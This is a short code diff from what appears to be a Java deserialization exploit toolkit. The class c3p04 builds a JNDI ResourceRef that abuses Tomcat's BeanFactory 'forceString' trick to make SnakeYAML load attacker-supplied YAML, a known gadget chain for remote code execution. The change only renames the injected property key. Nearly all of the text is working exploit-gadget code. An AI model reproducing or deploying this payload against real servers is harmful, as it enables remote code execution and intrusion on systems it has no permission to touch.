@@ -122,8 +122,8 @@ public class c3p04 implements ObjectPayload<Object> {
 
             ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                     true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", "nu1r=load"));
-            ref.add(new StringRefAddr("nu1r", yaml));
+            ref.add(new StringRefAddr("forceString", "QI4L=load"));
+            ref.add(new StringRefAddr("QI4L", yaml));
             return ref;
         }
 
